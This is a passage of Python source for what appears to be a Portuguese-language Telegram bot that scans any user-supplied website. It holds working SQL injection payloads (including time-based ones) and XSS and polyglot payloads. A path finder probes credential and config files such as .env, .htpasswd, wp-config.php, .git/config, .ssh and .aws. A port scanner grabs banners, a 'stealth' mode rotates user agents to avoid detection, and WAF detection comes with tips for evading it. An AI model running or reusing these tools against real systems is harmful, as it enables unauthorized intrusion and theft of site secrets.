def send_long_message(chat_id, text, prefix=""):
    """Split long messages into chunks respecting Telegram 4096 char limit"""
    MAX = 3900  # Safe limit (Telegram max is 4096)
    chunks = []
    current = prefix
    for line in text.split('\n'):
        # FIX v3.9: If a single line exceeds MAX, split it into pieces
        if len(line) > MAX:
            # Flush current chunk first
            if current.strip():
                chunks.append(current.rstrip())
            # Split the long line into pieces of MAX size
            while len(line) > MAX:
                chunks.append(line[:MAX])
                line = line[MAX:]
            current = line + '\n'
            continue
        if len(current) + len(line) + 1 > MAX:
            if current.strip():
                chunks.append(current.rstrip())
            current = prefix
        current += line + '\n'
    if current.strip():
        chunks.append(current.rstrip())
    for chunk in chunks:
        send_message_safe(chat_id, chunk)

def send_message_with_buttons(chat_id, text, buttons, parse_mode="HTML"):
    """Send message with inline keyboard buttons"""
    _rate_limit_wait(chat_id)
    try:
        # buttons is list of lists: [[{"text": "Rescan", "callback_data": "/rescan sqli url"}, ...]]
        resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True,
            "reply_markup": {"inline_keyboard": buttons}
        }, timeout=10)
        return resp
    except Exception as e:
        print(f"[Send Buttons Error] {e}")
        return None


def send_feedback_to_channel(user_id, username, first_name, message, channel_type="feedback"):
    """Forward feedback/bug report to the channel and return channel message_id"""
    if channel_type == "feedback":
        emoji = "🔰"
        title = "NOVO FEEDBACK DE AGENTE"
    else:
        emoji = "🐛"
        title = "NOVO BUG REPORTADO"

    channel_msg = f"""━━━━━━━━━━━━━━━━━━━━━━━━
{emoji} 📨 {title}
━━━━━━━━━━━━━━━━━━━━━━━━
│ 👤 Nome: {escape_html(first_name)}
│ 🔗 Username: @{escape_html(username) or 'Sem Username'}
│ 🆔 ID: {user_id}
│ 💬 Mensagem:
│ {escape_html(message[:500])}
━━━━━━━━━━━━━━━━━━━━━━━━

"""
    try:
        resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
            "chat_id": FEEDBACK_CHANNEL,
            "text": channel_msg,
            "parse_mode": "HTML"
        }, timeout=10)
        if resp and resp.status_code == 200:
            data = resp.json().get('result', {})
            return data.get('message_id', 0)
    except Exception as e:
        print(f"[Channel Error] {channel_type}: {e}")
    return 0


def db_cache_get(cmd, target):
    """Get cached result from DB. Returns result text or None."""
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT result FROM scan_cache WHERE cmd = ? AND target = ? AND (strftime('%s', 'now') - created_at) < ?",
                      (cmd, target, DB_CACHE_TTL))
            row = c.fetchone()
            if row:
                return row['result']
    except Exception as e:
        print(f"[DB Cache Error] get: {e}")
    return None


def db_cache_set(cmd, target, result):
    """Store result in DB cache"""
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO scan_cache (cmd, target, result, created_at) VALUES (?, ?, ?, ?)",
                      (cmd, target, result, time.time()))
            conn.commit()
    except Exception as e:
        print(f"[DB Cache Error] set: {e}")


def escape_html(text):
    """Escape HTML special chars in dynamic content"""
    if text is None:
        return "N/D"
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

# ═══════════════════════════════════════════════════════════════
#  OWNER CHECK
# ═══════════════════════════════════════════════════════════════
def is_owner(user_id):
    return user_id in OWNERS

# ═══════════════════════════════════════════════════════════════
#  SECURITY TOOLS v3.6
# ═══════════════════════════════════════════════════════════════

def _safe_get_stealth(url, timeout=10, headers=None):
    """Stealth GET request - slower, with randomized user agents to avoid detection"""
    stealth_ua = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    ]
    if not headers:
        headers = {}
    headers.setdefault('User-Agent', random.choice(stealth_ua))
    for attempt in range(2):
        try:
            return HTTP_SESSION.get(url, timeout=timeout, allow_redirects=True, headers=headers)
        except requests.exceptions.ConnectionError:
            if attempt < 1:
                time.sleep(random.uniform(1, 3))
            else:
                return None
        except Exception:
            return None
    return None

def _safe_get(url, timeout=5, headers=None):
    """Safe GET request with retry on connection errors (uses shared HTTP session).
    Supports custom headers (needed for DNS-over-HTTPS queries)."""
    for attempt in range(3):
        try:
            return HTTP_SESSION.get(url, timeout=timeout, allow_redirects=True, headers=headers)
        except requests.exceptions.ConnectionError:
            if attempt < 2:
                time.sleep(0.5)
            else:
                return None
        except Exception:
            return None
    return None

def tool_website_info(url):
    """Website Information Gathering - IMPROVED v3.6"""
    results = ""
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        response = _safe_get(url, timeout=5)
        if not response:
            return "❌ Não foi possível acessar o site"

        soup = BeautifulSoup(response.text, 'html.parser')

        ip = "Error"
        try:
            hostname = urlparse(url).netloc.split(':')[0]
            ip = socket.gethostbyname(hostname)
        except:
            pass

        # Detect technology stack
        tech = []
        headers = response.headers
        if 'x-powered-by' in headers:
            tech.append(headers['x-powered-by'])
        if 'server' in headers:
            tech.append(headers['server'])
        if 'x-generator' in headers:
            tech.append(headers['x-generator'])

        info = {
            'URL': escape_html(url),
            'Status': str(response.status_code),
            'Server': escape_html(response.headers.get('Server', 'N/D')),
            'Content-Type': escape_html(response.headers.get('Content-Type', 'N/D')),
            'X-Powered-By': escape_html(response.headers.get('X-Powered-By', 'N/D')),
            'X-Generator': escape_html(response.headers.get('X-Generator', 'N/D')),
            'IP': escape_html(ip),
            'Title': escape_html(soup.title.string if soup.title and soup.title.string else 'N/D'),
            'Meta Tags': str(len(soup.find_all('meta'))),
            'Links': str(len(soup.find_all('a'))),
            'Images': str(len(soup.find_all('img'))),
            'Scripts': str(len(soup.find_all('script'))),
            'Forms': str(len(soup.find_all('form'))),
            'Tamanho': f"{len(response.content) / 1024:.1f} KB",
        }

        results = "📡 <b>Informações do Site</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        for key, value in info.items():
            results += f"<b>{key}:</b> {value}\n"

        if tech:
            results += f"\n<b>💡 Tecnologias:</b> {', '.join(escape_html(t) for t in tech)}\n"
        results += "━━━━━━━━━━━━━━━━━━━━━━"
    except Exception as e:
        results = f"❌ Erro: {escape_html(str(e))}"
    return results

def tool_sqli(url, verbose=False):
    """SQL Injection Scanner v4.3 - 28 payloads, baseline comparison, ANTI-FALSE-POSITIVE, verbose mode"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    payloads = [
        # Basic tests
        "'", "\"", "1'", "1\"",
        # Boolean-based
        "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR '1'='1'--", "\" OR \"1\"=\"1\"--",
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        # Order by
        "1' ORDER BY 1--",
        "1' ORDER BY 5--",
        "1' ORDER BY 10--",
        # Additional
        "' OR 'x'='x",
        "' AND 1=1--",
        "' AND 1=2--",
        # Time-based
        "' AND SLEEP(3)--",
        "' WAITFOR DELAY '0:0:3'--",
        "' AND BENCHMARK(10000000,SHA1(1))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        # Parenthesis
        "') OR ('1'='1'--",
        "') UNION SELECT NULL--",
        "')) OR (('1'='1'--",
        # Additional time-based
        "' AND SLEEP(5)--",
        "' WAITFOR DELAY '0:0:5'--",
    ]

    error_signs = [
        'sql syntax', 'mysql error', 'mysql_fetch', 'mysql_num_rows',
        'mysql_result', 'postgresql error', 'sqlite error',
        'ora-00933', 'oracle error', 'microsoft sql server',
        'msql', 'microsoft ole db', 'syntax error', 'unterminated',
        'unclosed quotation', 'odbc drivers', 'java.sql.sql',
        'pg_query()', 'sqlite3::query', 'mssql_query',
        'sql injection', 'injection detected', 'sql error'
    ]

    # V5.1: WAF detection patterns
    waf_patterns = {
        'Cloudflare': ['cloudflare', 'cf-ray', 'cloudflare-challenge'],
        'Sucuri': ['sucuri', 'x-sucuri'],
        'ModSecurity': ['mod_security', 'modsecurity', 'blocked by mod_security'],
        'Imperva': ['imperva', 'x-iinfo', 'incap_ses'],
        'Barracuda': ['barracuda', 'barra_counter_session'],
        'F5 Big-IP': ['f5-big-ip', 'x-cdn', 'bigipserver'],
        'AWS WAF': ['aws-waf', 'x-amzn-requestid'],
        'DenyAll': ['denyall', 'x-cdn-denied'],
        'Comodo': ['comodo', 'x-cdn-comodo'],
        'Wordfence': ['wordfence', 'wf_ip', 'wf_rules'],
        'Generic WAF': ['forbidden', 'access denied', 'blocked by', 'waf block', 'security check', 'challenge'],
    }

    results = []
    verbose_log = []
    found = 0

    # V5.1: WAF detection on baseline
    detected_waf = []
    baseline_resp = _safe_get(url, timeout=5)
    # FIX v3.7: If site is offline, don't scan
    if not baseline_resp:
        return "❌ Não foi possível acessar o site para análise SQLi"
    baseline_len = len(baseline_resp.content)
    baseline_text = baseline_resp.text.lower()
    baseline_status = baseline_resp.status_code
    baseline_headers_lower = {k.lower(): v.lower() for k, v in baseline_resp.headers.items()}
    # V5.1: Detect WAF
    for waf_name, patterns in waf_patterns.items():
        for p in patterns:
            if p.lower() in baseline_text or any(p.lower() in v for v in baseline_headers_lower.values()):
                detected_waf.append(waf_name)
                break
    if detected_waf:
        verbose_log.append(f"🛡️ <b>WAF Detectada:</b> {', '.join(detected_waf)}")
    verbose_log.append(f"📊 <b>Baseline:</b> Status {baseline_status} | Len: {baseline_len}")

    def check_payload(payload):
        try:
            # FIX: use safe="" to encode quotes and special chars properly
            encoded = requests.utils.quote(payload, safe="")
            test_url = url + encoded
            response = _safe_get(test_url, timeout=5)
            if not response:
                if verbose:
                    verbose_log.append(f"  ❌ Timeout/Erro: <code>{escape_html(payload[:30])}</code>")
                return None
            body = response.text.lower()
            body_len = len(response.content)

            if verbose:
                verbose_log.append(f"  [{response.status_code}] <code>{escape_html(payload[:30])}</code> Len: {body_len}")

            # BASELINE FILTER: If response is identical to baseline, the payload had no effect
            if body_len == baseline_len and abs(len(body) - len(baseline_text)) < 10:
                if verbose:
                    verbose_log.append(f"    ↳ Idêntico ao baseline — descartado")
                return None

            # Check for error signs
            for sign in error_signs:
                if sign in body:
                    # Verify the error isn't in the baseline too (false positive)
                    if sign not in baseline_text:
                        if verbose:
                            verbose_log.append(f"    ⚠️ VULNERÁVEL! Sign: '{escape_html(sign)}'")
                        return payload, True
        except:
            pass
        return None

    # PERF: Use shared SCAN_POOL instead of creating new ThreadPoolExecutor
    futures = {SCAN_POOL.submit(check_payload, p): p for p in payloads}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            results.append(f"⚠️ <b>Vulnerável!</b> Payload: <code>{escape_html(result[0][:50])}</code>")

    # V5.1: Add WAF bypass suggestions if WAF detected and no vulns found
    waf_section = ""
    if detected_waf and found == 0:
        waf_section = f"\n🛡️ <b>WAF Detectada:</b> {', '.join(detected_waf)}\n"
        waf_section += "💡 <b>Dica:</b> O WAF pode estar bloqueando payloads.\n"
        waf_section += "   Use /stealth sqli <url> para scan mais discreto.\n"

    if found == 0:
        result_text = "✅ Nenhuma vulnerabilidade SQLi detectada"
        if verbose:
            result_text = "✅ Nenhuma vulnerabilidade SQLi detectada\n━━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(verbose_log)
        return result_text + waf_section
    else:
        header = f"🚨 <b>{found} vulnerabilidade(s) SQLi encontrada(s)!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        if verbose:
            return header + "\n".join(results) + "\n━━━━━━━━━━━━━━━━━━━━━━\n\n📋 <b>Log Detalhado:</b>\n" + "\n".join(verbose_log) + waf_section
        return header + "\n".join(results) + waf_section

def tool_xss_scanner(url, verbose=False):
    """XSS Scanner v4.3 - 18 payloads, STRICT unescaped reflection only, ANTI-FALSE-POSITIVE, verbose mode"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    payloads = [
        # Basic script tags
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        "<a href='javascript:alert(1)'>xss</a>",
        # Event handlers
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<div onmouseover=alert(1)>x</div>',
        "javascript:alert(1)//",
        '<img src="x" onerror="alert(1)">',
        '<svg><script>alert(1)</script></svg>',
        '<iframe src="javascript:alert(1)">',
        '<img src=x srcset="x" onerror=alert(1)>',
        # Angular/Vue/React
        '{{constructor.constructor("alert(1)")()}}',
        "{{_s.constructor('alert(1)')()}}",
        "${alert(1)}",
        '<img src=x onerror="alert(1)//">',
        # V5.1: Polyglot payloads (multi-context XSS)
        "';alert(document.domain)//",
        "\">&lt;img src=x onerror=alert(1)&gt;&lt;",
        "--!&gt;&lt;img src=x onerror=alert(1)&gt;&lt;!",
        "</script><img src=x onerror=alert(1)>",
        "</style><img src=x onerror=alert(1)>",
        "}};alert(document.domain)//",
    ]

    results = []
    verbose_log = []
    found = 0

    # Get baseline: response without any payload
    baseline_resp = _safe_get(url, timeout=5)
    # FIX v3.7: If site is offline, don't scan
    if not baseline_resp:
        return "❌ Não foi possível acessar o site para análise XSS"
    baseline_text = baseline_resp.text
    baseline_len = len(baseline_text)
    baseline_headers_lower = {k.lower(): v.lower() for k, v in baseline_resp.headers.items()}
    # V5.1: WAF detection
    waf_patterns_xss = {
        'Cloudflare': ['cloudflare', 'cf-ray'],
        'Sucuri': ['sucuri', 'x-sucuri'],
        'ModSecurity': ['mod_security', 'modsecurity'],
        'Imperva': ['imperva', 'x-iinfo'],
        'Wordfence': ['wordfence'],
    }
    detected_waf_xss = []
    for waf_name, patterns in waf_patterns_xss.items():
        for p in patterns:
            if p.lower() in baseline_text.lower() or any(p.lower() in v for v in baseline_headers_lower.values()):
                detected_waf_xss.append(waf_name)
                break
    if detected_waf_xss:
        if verbose:
            verbose_log.append(f"🛡️ <b>WAF Detectada:</b> {', '.join(detected_waf_xss)}")
    if verbose:
        verbose_log.append(f"📊 <b>Baseline:</b> Len: {baseline_len}")

    def check_payload(payload):
        try:
            encoded = requests.utils.quote(payload, safe="")
            test_url = url + encoded
            response = _safe_get(test_url, timeout=5)
            if not response:
                if verbose:
                    verbose_log.append(f"  ❌ Timeout: <code>{escape_html(payload[:30])}</code>")
                return None
            body = response.text

            if verbose:
                verbose_log.append(f"  [{response.status_code}] <code>{escape_html(payload[:30])}</code> Len: {len(body)}")

            # BASELINE FILTER: If response is identical to baseline, payload had no effect
            if body == baseline_text:
                if verbose:
                    verbose_log.append(f"    ↳ Idêntico ao baseline — descartado")
                return None

            # FIX: STRICT unescaped reflection check
            # 1. Full payload must appear as-is (unescaped)
            if payload in body:
                if verbose:
                    verbose_log.append(f"    ⚠️ VULNERÁVEL! (reflexão completa)")
                return payload, True

            # 2. Check for escaped version — if ALL versions are escaped, NOT vulnerable
            escaped_payload = html_lib.escape(payload)
            if escaped_payload in body and payload not in body:
                if verbose:
                    verbose_log.append(f"    ↳ Escapado — seguro")
                return None  # Fully escaped = safe

            # 3. Check for partial unescaped reflection of KEY EVENT HANDLERS
            event_handlers = ['onerror=', 'onload=', 'onfocus=', 'onmouseover=', 'ontoggle=', 'onstart=']
            for handler in event_handlers:
                if handler in payload and handler in body:
                    if handler not in baseline_text:
                        idx = body.find(handler)
                        if idx > 0:
                            context_start = max(0, idx - 10)
                            context = body[context_start:idx]
                            if '&lt;' in context:
                                if verbose:
                                    verbose_log.append(f"    ↳ Handler escapado — seguro")
                                continue  # Escaped, skip
                        if verbose:
                            verbose_log.append(f"    ⚠️ VULNERÁVEL! (handler: {escape_html(handler)})")
                        return payload, True
        except:
            pass
        return None

    # PERF: Use shared SCAN_POOL
    futures = {SCAN_POOL.submit(check_payload, p): p for p in payloads}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            results.append(f"⚠️ <b>XSS Refletido!</b> Payload: <code>{escape_html(result[0][:40])}</code>")

    # V5.1: WAF bypass suggestion
    xss_waf_section = ""
    if detected_waf_xss and found == 0:
        xss_waf_section = f"\n🛡️ <b>WAF Detectada:</b> {', '.join(detected_waf_xss)}\n💡 Use /stealth xss <url> para scan mais discreto.\n"

    if found == 0:
        if verbose:
            return "✅ Nenhuma vulnerabilidade XSS detectada\n━━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(verbose_log) + xss_waf_section
        return "✅ Nenhuma vulnerabilidade XSS detectada" + xss_waf_section
    else:
        header = f"🚨 <b>{found} vulnerabilidade(s) XSS encontrada(s)!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        if verbose:
            return header + "\n".join(results) + "\n━━━━━━━━━━━━━━━━━━━━━━\n\n📋 <b>Log Detalhado:</b>\n" + "\n".join(verbose_log) + xss_waf_section
        return header + "\n".join(results) + xss_waf_section

def tool_admin_finder(url, progress_chat_id=None, progress_msg_id=None):
    """Admin Panel Finder v3.6 - 70+ paths, full URL, ANTI-FALSE-POSITIVE, deduped with dir scanner"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    paths = [
        # Standard admin paths (directories)
        'admin/', 'administrator/', 'wp-admin/', 'admincp/',
        'adminpanel/', 'webadmin/', 'admin/', 'admins/',
        'joomla/administrator/', 'cms/administrator/',
        'logins/', 'administration/', 'login/', 'auth/', 'signin/',
        'manager/', 'backend/', 'panel/', 'control/',
        'dashboard/', 'cpanel/', 'myadmin/', 'phpmyadmin/',
        'admin2/', 'admin3/', 'admin4/', 'admin5/', 'admin1/',
        'moderator/', 'moderator/admin/', 'administrator/',
        'controlpanel/', 'cpanel/', 'siteadmin/',
        'sysadmin/', 'instadmin/', 'bb-admin/', 'bbadmin/',
        'member/', 'members/', 'console/', 'settings/',
        'user/login/', 'account/login/', 'site/login/',
        'phpmyadmin/', 'myadmin/',
        # V5.1: More admin paths
        'login/admin/', 'portal/', 'manage/', 'access/',
        'backend/', 'secure/', 'restricted/',
        'webpanel/', 'adminportal/', 'mypanel/',
        'adminarea/', 'adminpanel/', 'siteadmin/',
        'staff/', 'operator/', 'supervisor/',
        'root/', 'sudo/', 'superadmin/',
        'config/', 'setup/', 'install/',
        # Admin files (NO trailing slashes on files)
        'admin.php', 'admin.html', 'admin.asp', 'admin.jsp',
        'admincp.php', 'cp.php', 'admin/index.php', 'admin/index.html',
        'admin/login.php', 'admin/index.asp', 'admin/default.php',
        'admin/login.html', 'admin/account.php', 'admin/account.html',
        'admin1/', 'admin1.php', 'admin1.html',
        'admin1/account.php', 'admin1/login.php',
        'admin2/login.php', 'admin2/index.php',
        'admin3/login.php', 'admin3/index.php',
        'moderator.php', 'moderator/login.php', 'moderator/admin.php',
        'administrator/login.php', 'administrator/index.php',
        'panel.php', 'panel/admin.php', 'panel/login.php',
        'controlpanel.php', 'cpanel.php',
        'webadmin.php', 'siteadmin/login.php', 'siteadmin/index.php',
        'sysadmin/login.php', 'instadmin/login.php',
        'bb-admin/login.php', 'bb-admin/index.php', 'bbadmin/login.php',
        'member/login.php', 'member/admin.php',
        'members/login.php', 'members/admin.php',
        'console/login.php', 'settings/login.php',
        'phpmyadmin/index.php', 'phpmyadmin/login.php',
        'myadmin/index.php', 'myadmin/login.php',
        'wp-login.php', 'admin.php', 'login.php',
        'config.php', 'phpinfo.php',
        '.env', '.htaccess', '.htpasswd',
        'wp-config.php', 'wp-config.php.bak',
        'config/database.yml', 'config/application.php',
        'config.ini', 'settings.ini', 'appsettings.json',
    ]

    # FIX v3.9: Deduplicate paths using set()
    paths = list(dict.fromkeys(paths))  # Preserves order, removes duplicates
    base_url = url.rstrip('/')
    results = []
    found = 0
    total = len(paths)

    # Get baseline: a random path that definitely doesn't exist
    baseline = _safe_get(f"{base_url}/{random_string(12)}.xyz", timeout=3)
    baseline_status = baseline.status_code if baseline else 404
    baseline_len = len(baseline.content) if baseline else 0

    # Get root page content for comparison
    root = _safe_get(base_url, timeout=3)
    root_len = len(root.content) if root else 0

    # V5.1: Thread-safe counter
    import threading as _threading
    _progress_lock = _threading.Lock()
    checked_count = [0]  # Use list for mutability across threads

    def check_path(path):
        with _progress_lock:
            checked_count[0] += 1
            current = checked_count[0]
        # Report progress every 10 paths
        if current % 10 == 0 and progress_chat_id and progress_msg_id:
            try:
                edit_progress(progress_msg_id, progress_chat_id, current, total, "Escaneando paths...")
            except:
                pass
        try:
            full_path = f"{base_url}/{path}"
            r = _safe_get(full_path, timeout=3)
            if not r:
                return None
            body = r.text
            body_len = len(r.content)

            # FILTER 1: Body too small (< 50 chars) = generic error page
            if body_len < 50:
                return None

            # FILTER 2: Status 404 = definitely not found
            if r.status_code == 404:
                return None

            # FILTER 3: Body is identical to root page = catch-all / SPA route
            if r.status_code == 200 and body_len == root_len and root_len > 0:
                return None

            # FILTER 4: Body is identical to baseline (wildcard 403/404 page)
            if body_len == baseline_len and baseline_len > 0 and body_len > 0:
                if abs(len(body) - len(baseline.text)) < 10:
                    return None

            # FILTER 5: Check for common error page content
            error_phrases = [
                'does not exist', 'not found', 'page not found',
                '404 error', 'the requested url', 'resource not found',
                'not found on this server', 'no such file',
                'doesnt exist', 'page does not',
            ]
            body_lower = body.lower()
            for phrase in error_phrases:
                if phrase in body_lower:
                    return None

            # FILTER 6: 403 must have a real login form or admin content
            if r.status_code in [403, 401]:
                admin_indicators = [
                    'login', 'password', 'username', 'sign in',
                    'admin', 'dashboard', 'panel', 'access denied',
                    'forbidden', 'login form', 'authentication',
                    'wp-login', 'administrator', 'phpmyadmin',
                ]
                if not any(indicator in body_lower for indicator in admin_indicators):
                    known_admin = ['admin', 'administrator', 'wp-admin', 'phpmyadmin', 'myadmin', 'panel', 'backend', 'cpanel', 'phpinfo']
                    if not any(k in path for k in known_admin):
                        return None

            return (full_path, r.status_code)
        except:
            pass
        return None

    # PERF: Use shared SCAN_POOL
    futures = {SCAN_POOL.submit(check_path, p): p for p in paths}
    completed = 0
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        completed += 1
        if result:
            found += 1
            emoji = "🔓" if result[1] == 200 else "🚫"
            results.append(f"{emoji} <b>/{escape_html(result[0].split(base_url + '/', 1)[-1])}</b> (Status: {result[1]})")
        # Update progress
        if completed % 10 == 0 and progress_chat_id and progress_msg_id:
            try:
                edit_progress(progress_msg_id, progress_chat_id, completed, total, "Escaneando paths...")
            except:
                pass

    if found == 0:
        return f"🔍 <b>Painel Admin</b> — {escape_html(base_url)}\n━━━━━━━━━━━━━━━━━━━━━━\n\n✅ Nenhum painel admin encontrado"
    else:
        # V5.1: Better formatted results with emojis
        header = f"🔍 <b>Painel Admin</b> — {escape_html(base_url)}\n━━━━━━━━━━━━━━━━━━━━━━\n\n🚨 <b>{found} painel(is) encontrado(s)!</b>\n"
        formatted = []
        for r in results:
            formatted.append(r)
        return header + "\n".join(formatted)

def tool_port_scanner(target):
    """Port Scanner v3.6 - 26 portas"""
    # Extract clean hostname from URL if needed
    hostname = extract_hostname(target)
    try:
        target_ip = socket.gethostbyname(hostname)
    except:
        return f"❌ Domínio/IP inválido: {escape_html(hostname)}"

    ports = {
        21: "FTP", 22: "SSH", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 993: "IMAPS",
        995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
        3000: "Node", 3306: "MySQL", 3389: "RDP",
        4000: "Dev", 5000: "Docker", 5432: "PostgreSQL",
        5900: "VNC", 6379: "Redis", 8000: "HTTP-Alt2",
        8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "Alt3",
        9090: "Grafana", 9200: "Elasticsearch",
        11211: "Memcached", 27017: "MongoDB",
    }

    results = f"🔍 <b>Scan de Portas</b> — {escape_html(hostname)} ({escape_html(target_ip)})\n━━━━━━━━━━━━━━━━━━━━━━\n"
    found = 0

    def grab_banner(port, timeout=2):
        """V5.1: Grab service banner for version detection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target_ip, port))
            # For HTTP/HTTPS, send a minimal request
            if port in (80, 8080, 8000, 8443, 443, 9090, 9200, 3000, 4000, 5000):
                sock.sendall(b"GET / HTTP/1.0\r\nHost: " + hostname.encode() + b"\r\n\r\n")
            else:
                # For other services, just wait for banner
                pass
            data = b""
            try:
                data = sock.recv(512)
            except:
                pass
            sock.close()
            if data:
                banner = data.decode('utf-8', errors='replace').strip()
                # Extract just the server header line
                for line in banner.split('\n'):
                    if line.lower().startswith('server:'):
                        return line[7:].strip()
                    if 'HTTP/' in line and 'Server' in banner:
                        continue
                # Return first line if it looks like a banner
                first_line = banner.split('\n')[0].strip()
                if first_line and len(first_line) < 100:
                    return first_line
            return ""
        except:
            return ""

    def scan_port(port):
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                # V5.1: Grab banner for version detection
                banner = grab_banner(port)
                return port, True, banner
            return port, False, ""
        except:
            return port, False, ""
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

    # PERF: Use shared SCAN_POOL
    futures = {SCAN_POOL.submit(scan_port, p): p for p in ports}
    for future in concurrent.futures.as_completed(futures):
        port, is_open, banner = future.result()
        if is_open:
            found += 1
            banner_info = f" — <i>{escape_html(banner[:50])}</i>" if banner else ""
            results += f"🔓 <b>Porta {port}</b> ({ports[port]}) — Aberta{banner_info}\n"

    if found == 0:
        results += "✅ Nenhuma porta aberta encontrada"
    else:
        results += f"━━━━━━━━━━━━━━━━━━━━━━\n📊 Total: <b>{found}</b> porta(s) aberta(s)"

    return results

def tool_directory_scanner(url):
    """Directory Scanner v3.6 - 36 diretórios, ANTI-FALSE-POSITIVE, deduped with admin finder"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    # FIX: Removed duplicate paths that are already in admin finder
    # (.env, .htaccess, phpinfo.php removed from here — they're in admin finder)
    dirs = [
        'backup', 'backups', 'css', 'images',
        'js', 'logs', 'temp', 'upload', 'uploads',
        'api', 'config', 'data', 'cache', 'docs',
        'includes', 'src', 'lib', 'bin', 'etc',
        '.git', '.git/config',
        '.well-known', '.well-known/security.txt',
        'robots.txt', 'sitemap.xml',
        'info.php', 'server-status',
        '.svn', '.hg', '.DS_Store', 'test',
        'debug', 'debug.log', 'php.ini',
        # V5.1: Additional paths (expanded from 45 to 80+)
        '.aws', '.ssh', 'vendor', 'node_modules',
        '.docker', 'docker-compose.yml',
        'Makefile', 'composer.json', 'package.json',
        'README.md', 'CHANGELOG.md',
        'public', 'private', 'tmp',
        'staging', 'dev', 'test-env',
        'old', 'archive', 'legacy',
        'db', 'database', 'sql',
        # V5.1: More paths
        '.env', '.htaccess', '.htpasswd', '.gitignore',
        'wp-config.php', 'wp-content', 'wp-admin',
        'phpmyadmin', 'phpmyadmin/', 'pma',
        'mysql', 'pgadmin', 'adminer',
        'webmail', 'mail', 'cpanel', 'whm',
        'solr', 'elasticsearch', 'kibana',
        'grafana', 'prometheus', 'swagger',
        'graphql', 'rest', 'api/v1', 'api/v2',
        '.npmrc', '.dockerignore', 'Dockerfile',
        '.idea', '.vscode', '.project',
        'wp-login.php', 'xmlrpc.php',
        'server-info', 'server-status',
        'cgi-bin', 'bin', 'shell',
        'wp-json', 'rest-api',
        'swagger.json', 'openapi.json',
        '.well-known/caldav', '.well-known/carddav',
        'phpinfo.php', 'phpinfo',
    ]

    base_url = url.rstrip('/')
    results = []
    found = 0

    # Get baseline: a random path that definitely doesn't exist
    baseline = _safe_get(f"{base_url}/{random_string(12)}.xyz", timeout=3)
    baseline_len = len(baseline.content) if baseline else 0
    baseline_status = baseline.status_code if baseline else 404

    def check_dir(d):
        try:
            r = _safe_get(f"{base_url}/{d}", timeout=3)
            if not r:
                return None
            body = r.text
            body_len = len(r.content)

            # FILTER 1: Body too small (< 30 chars) = generic error
            if body_len < 30:
                return None

            # FILTER 2: Status 404 = definitely not found
            if r.status_code == 404:
                return None

            # FILTER 3: Body identical to baseline = wildcard catch-all
            if body_len == baseline_len and baseline_len > 0 and body_len > 0:
                if abs(len(body) - len(baseline.text)) < 10:
                    return None

            # FILTER 4: Check for common error page content
            error_phrases = [
                'does not exist', 'not found', 'page not found',
                '404 error', 'the requested url', 'resource not found',
                'not found on this server', 'no such file',
                'doesnt exist', 'page does not',
            ]
            body_lower = body.lower()
            for phrase in error_phrases:
                if phrase in body_lower:
                    return None

            # FILTER 5: 403 must have meaningful content
            if r.status_code == 403:
                if body_len < 100:
                    return None
                # 403 with only a short message = probably generic
                if body_len < 200 and 'directory' not in body_lower and 'forbidden' not in body_lower:
                    return None

            return (d, r.status_code)
        except:
            pass
        return None

    # PERF: Use shared SCAN_POOL
    futures = {SCAN_POOL.submit(check_dir, d): d for d in dirs}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            emoji = "🔓" if result[1] == 200 else "🚫"
